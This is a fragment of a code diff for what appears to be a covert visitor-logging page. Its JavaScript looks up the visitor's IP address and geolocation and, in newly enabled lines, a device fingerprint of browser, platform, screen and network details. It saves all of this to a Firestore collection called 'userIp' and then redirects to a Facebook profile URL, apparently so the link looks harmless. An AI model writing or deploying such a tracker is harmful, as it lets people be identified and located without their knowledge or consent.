@@ -16,20 +16,20 @@ fetch('https://api.ipify.org/?format=json')
             isp: data.isp,
         }
 
-//         const deviceInfo = {
-//           userAgent: navigator.userAgent,
-//           language: navigator.language,
-//           platform: navigator.platform,
-//           screenWidth: window.screen.width,
-//           screenHeight: window.screen.height,
-//           networkeffectiveType: navigator.connection.effectiveType,
-//           networkdownlink: navigator.connection.downlink,
-//         };
+const deviceInfo = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    networkeffectiveType: navigator.connection ? navigator.connection.effectiveType : undefined,
+    networkdownlink: navigator.connection ? navigator.connection.downlink : undefined,
+};
 
-//         console.log(deviceInfo);
+console.log(deviceInfo);
 
         db.collection("userIp").add({
-            ipAddress, time: new Date(), geoBasicInfo,
+            ipAddress, time: new Date(), geoBasicInfo, deviceInfo,
 //             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
         }).then(_ => {
             window.location.replace("http://www.facebook.com/profile.php?")
